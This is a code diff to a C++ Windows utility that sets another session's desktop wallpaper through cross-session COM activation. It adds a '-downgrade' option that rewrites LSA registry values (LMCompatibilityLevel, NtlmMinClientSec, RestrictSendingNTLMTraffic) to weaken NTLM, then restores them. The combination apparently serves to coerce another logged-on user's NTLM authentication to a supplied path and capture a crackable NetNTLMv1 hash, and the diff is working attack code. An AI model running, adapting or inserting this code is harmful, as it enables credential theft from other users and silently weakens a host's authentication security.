@@ -5,6 +5,9 @@
 #include <iostream>
 #include <atlbase.h>
 #include <strsafe.h>
+#include <stdio.h>
+#include <winreg.h>
+#include <stdint.h>
 
 HRESULT CoCreateInstanceInSession(DWORD session, REFCLSID rclsid, REFIID riid, void** ppv) {
     BIND_OPTS3 bo = {};
@@ -18,10 +21,68 @@ HRESULT CoCreateInstanceInSession(DWORD session, REFCLSID rclsid, REFIID riid, v
     return CoGetObject(wszMonikerName, &bo, riid, ppv);
 }
 
+void GetRegKey(const wchar_t* path, const wchar_t* key, DWORD* oldValue) {
+    HKEY hKey;
+    DWORD value;
+    DWORD valueSize = sizeof(DWORD);
+
+
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegQueryValueExW(hKey, key, NULL, NULL, (LPBYTE)&value, &valueSize);
+        RegCloseKey(hKey);
+        *oldValue = value;
+    }
+    else {
+        printf("Error reading registry key.\n");
+    }
+}
+
+void SetRegKey(const wchar_t* path, const wchar_t* key, DWORD newValue) {
+    HKEY hKey;
+
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExW(hKey, key, 0, REG_DWORD, (const BYTE*)&newValue, sizeof(DWORD));
+        RegCloseKey(hKey);
+    }
+    else {
+        printf("Error writing registry key.\n");
+    }
+}
+
+void ExtendedNTLMDowngrade(DWORD* oldValue_LMCompatibilityLevel, DWORD* oldValue_NtlmMinClientSec, DWORD* oldValue_RestrictSendingNTLMTraffic) {
+    GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
+    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", 2);
+
+    GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", oldValue_NtlmMinClientSec);
+    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", 536870912);
+
+    GetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
+    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", 0);
+}
+
+void NTLMRestore(DWORD oldValue_LMCompatibilityLevel, DWORD oldValue_NtlmMinClientSec, DWORD oldValue_RestrictSendingNTLMTraffic) {
+    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa", L"LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
+    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"NtlmMinClientSec", oldValue_NtlmMinClientSec);
+    SetRegKey(L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", L"RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
+}
+
 int wmain(int argc, wchar_t* argv[]) {
-    if (argc != 3) {
-        std::wcerr << L"Usage: " << argv[0] << L" <session> <image_path>" << std::endl;
+    if (argc < 3 || argc > 4) {
+        std::wcerr << L"Usage: " << argv[0] << L" <session> <image_path> [-downgrade]" << std::endl;
         return 1;
+    }
+
+    bool downgrade = false;
+    if (argc == 4 && wcscmp(argv[3], L"-downgrade") == 0) {
+        downgrade = true;
+    }
+
+    DWORD oldValue_LMCompatibilityLevel = 0;
+    DWORD oldValue_NtlmMinClientSec = 0;
+    DWORD oldValue_RestrictSendingNTLMTraffic = 0;
+
+    if (downgrade) {
+        ExtendedNTLMDowngrade(&oldValue_LMCompatibilityLevel, &oldValue_NtlmMinClientSec, &oldValue_RestrictSendingNTLMTraffic);
     }
 
     DWORD session = _wtoi(argv[1]);
@@ -83,5 +144,10 @@ int wmain(int argc, wchar_t* argv[]) {
 
     pDesktopWallpaper->Release();
     CoUninitialize();
+
+    if (downgrade) {
+        NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
+    }
+
     return 0;
 }
